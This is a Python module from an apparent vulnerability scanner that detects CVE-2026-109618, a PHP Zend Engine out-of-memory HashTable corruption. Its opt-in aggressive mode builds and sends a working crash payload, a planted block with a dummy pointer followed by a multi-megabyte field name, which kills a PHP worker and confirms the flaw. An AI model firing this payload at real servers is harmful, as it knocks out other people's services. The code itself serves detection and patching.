from __future__ import annotations

import re
from typing import Any

from ...core.categories import VulnerabilityType
from ...core.http import HttpSession, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Confidence, Finding, Status
from ...core.transcript import attach_transcript
from .php_2026_memory import classify_version as _classify_version
from .php_2026_memory import metadata as build_metadata
from .php_2026_memory import runtime_finding

CVE_ID = "CVE-2026-109618"
NAME = "PHP Zend Engine OOM HashTable state corruption"
RULE = "PHP 8.2 before 8.2.35, 8.3 before 8.3.36, 8.4 before 8.4.27, and 8.5 before 8.5.12; legacy branches require package verification"
TYPE = VulnerabilityType.MEMORY_CORRUPTION
HAS_EXPLOIT = True
EXPLOIT_MODES = ["aggressive"]

# OOM geometry from the advisory/Datadog walkthrough: an empty-named field
# carrying a 276-byte planted block, then a ~3.5 MB array-syntax field name.
# With the lab's memory_limit=16M the allocation fails during input parsing;
# the planted block points at invalid memory so a consumed bucket faults the
# worker instead of executing anything. No valid callback is ever planted.
PLANT_SIZE = 276
FIELD_NAME_LEN = 3500000
CRASH_STATUSES = {0, 502, 503}


def classify_version(version: str | None) -> str:
    return _classify_version(version)


def build_oom_body() -> bytes:
    """Build the 618-shape urlencoded body with an invalid-memory plant."""
    buf = bytearray(b"A" * PLANT_SIZE)
    ptr = (0x4141414141414141).to_bytes(8, "little")
    buf[8:16] = ptr  # Bucket[1].val.value
    buf[16:20] = (7).to_bytes(4, "little")  # IS_ARRAY
    buf[20:24] = b"\x00" * 4
    buf[24:32] = b"\x00" * 8  # Bucket[1].h
    buf[32:40] = ptr  # Bucket[1].key
    for i, byte in enumerate(bytes(buf)):
        if byte in (0x26, 0x3D, 0x25, 0x2B):  # keep '&', '=', '%', '+' out
            buf[i] = 0x41
    return b"=" + bytes(buf) + b"&a=1&" + b"Z" * FIELD_NAME_LEN + b"[x]=1"


def read_pid(body: str) -> int | None:
    """Parse the lab pid.php worker identity."""
    match = re.search(r"PID=(\d+)", body or "")
    return int(match.group(1)) if match else None


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    """Fire the 618 OOM shape and compare worker death against survival.

    Lab-only: the request kills one prefork child on affected builds (the
    single-worker lab respawns it, observable as a PID change). Fixed
    builds answer with a clean HTTP fatal ("Allowed memory size ... Unknown
    on line 0") and keep the same worker. No valid code pointer is ever
    planted, so nothing executes either way.
    """
    base = normalize_url(target_url)
    sess = HttpSession(base, timeout=timeout, proxy=proxy)
    shot_timeout = max(timeout, 60)

    baseline = sess.get("/pid.php", timeout=timeout)
    if baseline.get("status") != 200 or read_pid(str(baseline.get("body", ""))) is None:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            detail=(
                "The lab baseline endpoint /pid.php did not answer with a worker identity. "
                "The crash differential needs the single-worker lab app; no payload was sent."
            ),
            action="Serve the labs/cve-2026-109618 app (index.php + pid.php) and retry in an isolated lab.",
            vulnerability_type=TYPE,
        )
    pid_before = read_pid(str(baseline.get("body", "")))

    response = sess.post(
        "/index.php",
        data=build_oom_body(),
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=shot_timeout,
    )
    body = str(response.get("body", ""))
    crashed = is_transport_error(response) or int(response.get("status", 0) or 0) in CRASH_STATUSES
    fatal_memory = "Allowed memory size" in body
    unknown_line0 = "Unknown on line 0" in body

    after = sess.get("/pid.php", timeout=timeout)
    pid_after = read_pid(str(after.get("body", "")))
    pid_changed = pid_before is not None and pid_after is not None and pid_before != pid_after

    evidence = attach_transcript(
        {
            "endpoint": "/index.php",
            "probe_bytes": len(build_oom_body()),
            "pid_before": pid_before,
            "pid_after": pid_after,
            "pid_changed": pid_changed,
            "send_status": response.get("status"),
            "transport_error": (response.get("error") or {}).get("type")
            if isinstance(response.get("error"), dict)
            else None,
            "fatal_memory_text": fatal_memory,
            "unknown_line0_text": unknown_line0,
        },
        sess,
    )

    if crashed:
        detail = (
            "The OOM-shape request killed the lab worker: the connection died "
            f"({transport_error_detail(response)})"
        )
        if pid_changed:
            detail += f" and the single-worker lab respawned (PID {pid_before} -> {pid_after})"
        detail += (
            ". Fixed builds answer the same shape with a clean HTTP fatal instead of dying. "
            "This confirms CVE-2026-109618 without executing any planted address."
        )
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.VULNERABLE,
            confidence=Confidence.CONFIRMED,
            component="PHP runtime",
            affected_rule=RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=f"{base}/pid.php",
            detail=detail,
            action=(
                "Upgrade PHP to the fixed branch release (8.2.35/8.3.36/8.4.27/8.5.12). "
                "For EOL branches, verify the vendor package changelog or binary backport."
            ),
            evidence=evidence,
            vulnerability_type=TYPE,
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=Status.NOT_CONFIRMED,
        confidence=Confidence.MEDIUM,
        component="PHP runtime",
        affected_rule=RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        detail=(
            f"The worker survived the OOM-shape request with a clean HTTP {response.get('status')} response "
            f"(same PID {pid_before}; fatal-text={fatal_memory}). That is the fixed-build behavior."
        ),
        action="No action required if the runtime is at or beyond the branch-specific fixed release.",
        evidence=evidence,
        vulnerability_type=TYPE,
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    php_runtime: dict[str, Any] | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
):
    del cms_version, aggressive_command, aggressive_args
    passive = runtime_finding(
        cve=CVE_ID,
        name=NAME,
        vulnerability_type=TYPE,
        rule=RULE,
        action="Upgrade PHP to the fixed branch release. For EOL branches, verify the vendor package changelog or binary backport before classifying the installation.",
        php_runtime=php_runtime,
    )
    passive.exploit_available = HAS_EXPLOIT
    if not run_exploit_check:
        return passive
    if exploit_mode != "aggressive":
        passive.detail += " This CVE needs the lab-only OOM crash differential (aggressive: one worker is killed)."
        return passive
    if passive.status not in {Status.LIKELY_VULNERABLE, Status.DETECTED_VERSION_UNKNOWN}:
        passive.detail += " Aggressive proof skipped because the PHP version was not potentially affected."
        return passive
    result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    meta = build_metadata(
        cve=CVE_ID,
        name=NAME,
        vulnerability_type=TYPE,
        rule=RULE,
        references=["https://www.php.net/", "https://nvd.nist.gov/vuln/detail/CVE-2026-109618"],
    )
    meta["exploit_available"] = HAS_EXPLOIT
    meta["exploit_modes"] = EXPLOIT_MODES
    meta["intrusive"] = True
    return meta
